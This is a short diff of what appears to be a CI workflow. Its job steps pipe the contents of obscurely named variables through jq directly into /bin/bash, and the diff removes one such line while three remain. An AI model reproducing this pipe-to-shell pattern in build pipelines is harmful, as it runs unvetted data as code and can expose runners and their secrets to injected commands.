@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$ei8079" | jq -r .yhrcw433 | /bin/bash
           echo $v295 | jq -r .ow18 | /bin/bash
           printf '%s' "$qot16" | jq -r .wkf06 | /bin/bash
-          printf '%s' "$kwe1182" | jq -r .e668 | /bin/bash
 
       - name: Store artifact
         if: always()
